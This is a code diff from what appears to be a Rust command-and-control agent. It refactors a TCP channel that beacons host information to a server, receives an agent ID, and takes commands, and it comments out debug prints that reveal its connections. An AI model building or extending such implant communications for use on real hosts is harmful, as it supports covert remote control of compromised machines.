@@ -7,7 +7,7 @@ use crate::communication::codec::JsonCodec;
 use crate::communication::message::{AgentMessage, ServerMessage};
 use crate::post::commands::AgentCommand;
 use crate::utils::logger::Logger;
-use crate::communication::comm::channel::CommChannel;
+use crate::communication::channels::channel::CommChannel;
 
 
 
@@ -21,7 +21,7 @@ pub struct TcpCommChannel {
 impl CommChannel for TcpCommChannel {
     async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,
     ) -> (u64, String) {
-        let beacon = match crate::communication::comm::channel::get_info(key).await {
+        let beacon = match crate::communication::channels::channel::get_info(key).await {
             Ok(beacon) => beacon,
             Err(e) => {
                 logger.error(&format!("[-] Failed to get host info: {:?}", e));
@@ -30,7 +30,7 @@ impl CommChannel for TcpCommChannel {
         };
     
         for attempt in 1..=self.retries {
-            println!("[*] Attempting beacon (attempt {}/{})", attempt, self.retries);
+            logger.log(&format!("[*] Attempting beacon (attempt {}/{})", attempt, self.retries));
             match send_message(&self.address, beacon.clone(), self.timeout).await {
                 Ok(Some(ServerMessage::Ack {
                     agent_id,
@@ -137,7 +137,7 @@ impl CommChannel for TcpCommChannel {
 /// returning a `TcpStream` on success. If the connection fails, returns an error
 /// with a formatted message describing the failure reason.
 async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> Result<Option<ServerMessage>, String> {
-    println!("[*] Connecting to {}", addr);
+    // println!("[*] Connecting to {}", addr);
 
     
     let stream = TcpStream::connect(addr).await.map_err(|e| format!("Connect failed: {}", e))?;
@@ -145,7 +145,7 @@ async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> R
     let mut framed_rx = FramedRead::new(read_half, JsonCodec::<ServerMessage>::new());
     let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<AgentMessage>::new());
 
-    println!("[*] Sending message: {:?}", message);
+    // println!("[*] Sending message: {:?}", message);
     
     framed_tx.send(message).await.map_err(|e| format!("Send failed: {}", e))?;
 
